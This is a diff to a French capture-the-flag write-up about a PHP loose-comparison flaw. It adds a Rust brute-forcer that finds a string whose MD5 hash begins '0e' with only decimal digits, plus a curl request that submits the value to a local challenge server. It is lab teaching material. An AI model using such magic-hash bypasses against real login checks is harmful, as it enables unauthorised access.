@@ -75,7 +75,7 @@ Session completed
 Ainsi le mdp est `passw0rd`. On en extrait un fichier `index.php` qui contient donc du code PHP intéressant
 
 ## 3 - La faile PHP de `index.php`
-### PHP c'est la *loose*
+### 3.1 PHP c'est la *loose*
 Voici le contenu du fichier `index.php`:
 ```php
 <?php
@@ -125,7 +125,7 @@ Tiens tiens, PHP comprend la notation scientifique (le fameux E dans les calcula
 (Cette idée de la notation scientifique pour la loose equality est facilement trouvable sur le net, même si étonnamment mal présentée la plupart des fois)
 Du coup, si on a une chaîne de la forme `0e456123...454654`, qu'importe le nombre décimal situé après le 0, le résultat restera 0: `0 * (10 ^ n) == 0 quel que soit n`.
 
-### 3.1 Exploitation de la faille
+### 3.2 Exploitation de la faille
 Du coup les contraintes sur notre hash se sont relâchées *beaucoup*: il suffit qu'il commence par `0e` et qu'ensuite il n'y ait pas de lettres héxa.
 Donc grosso modo nous sommes passés d'avoir une chance sur `2 ^ 128` de tomber pile sur un hash nul à une chance sur `2 ^ 8 * ((16/10) ^ 30)`:
 ```python
@@ -242,8 +242,75 @@ user	21m24.196s
 sys	0m0.744s
 ```
 
+- en Rust (optimised single-threaded)
+```rust
+extern crate md5;
+/* Cargo.toml:
+ * [dependencies]
+ * md5 = "0.4.0"
+ */
 
-### 3.2 Vérifier la solution
+struct PrettyPrint([u8; 15]);
+impl ::std::fmt::Display for PrettyPrint {
+    fn fmt (
+        self: &Self,
+        stream: &mut ::std::fmt::Formatter,
+    ) -> ::std::fmt::Result
+    {
+        for &x in &self.0 {
+            write!(stream, "{}", x as char)?;
+        };
+        Ok(())
+    }
+}
+
+fn main () {
+    println!(
+        "Solution found! {}",
+        PrettyPrint(search_solution()),
+    );
+}
+
+fn search_solution () -> [u8; 15]
+{
+    let mut base: [u8; 15] = [
+      b'0', b'0', b'0', b'0', b'0', b'0', b'0', b'0', b'0',
+      b'S', b'h', b'r', b'e', b'w', b'k',
+    ];
+    loop {
+        for x in base[0 .. 9].iter_mut().rev() {
+            if *x >= b'9' {
+                *x = b'0';
+            } else {
+                *x += 1;
+                break;
+            }
+        }
+        let digest = <[u8; 16]>::from(::md5::compute(&base));
+        if digest[0] == 0x0e && digest[1 .. digest.len()]
+                                   .iter()
+                                   .all(|&x| {
+                                       (x & 0xf) <= 0x9
+                                       && x <= 0x99
+                                   })
+        {
+            return base
+        };
+    }
+}
+```
+```sh
+$ cargo rustc --release -- -C opt-level=3 -C link-args="-flto"
+[...]
+$ time ./target/release/brute_rs_optimised_single_threaded
+Solution found! 202900081Shrewk
+
+real	0m38.186s
+user	0m37.932s
+sys	0m0.120s
+```
+
+### 3.3 Vérifier la solution
 ```sh
 $ curl -X POST -d 'h1=202900081' http://localhost:8080
 <html>
